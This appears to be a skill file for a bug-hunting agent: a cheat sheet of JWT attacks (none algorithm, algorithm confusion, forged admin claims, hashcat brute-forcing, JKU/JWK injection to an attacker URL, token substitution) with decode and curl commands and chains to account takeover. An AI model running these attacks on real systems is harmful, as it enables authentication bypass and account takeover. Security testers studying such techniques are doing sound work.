---
name: hunt-jwt
description: JWT attacks — none algorithm, alg confusion, key brute, claim manipulation, JKU/JWK injection, token substitution. Chains to auth bypass and ATO.
---

# JWT ATTACKS — 3 BULLETS MAX

**Core:** JWT flaws = authentication bypass = ATO.

## DETECTION
```bash
# Decode JWT
echo "eyJhbGci...header.eyJzdWI..." | cut -d. -f2 | base64 -d 2>/dev/null
# Check alg
curl -s "https://target.com/api/data" -H "Authorization: Bearer TOKEN" | head -1
# Decode header
echo "eyJhbGci...header" | base64 -d
```

## ATTACKS
```
None algorithm: change alg to "none", remove signature
Alg confusion: RS256→HS256, sign with public key as HMAC secret
Claim manipulation: {"sub":"admin","role":"admin","exp":9999999999}
Key brute: hashcat -m 16500 jwt.txt wordlist.txt
JKU injection: set jku to attacker's URL → server fetches attacker's key
Key confusion via JWKS: host malicious JWKS → set kid to attacker URL
Token substitution: swap tokens between accounts
Refresh token abuse: test if valid after password change/logout
```

## CHAINS
```
None algorithm → admin access → Critical
Alg confusion → forge admin token → Critical
Claim manipulation → privilege escalation → Critical
Key brute → forge任意token → Critical
```
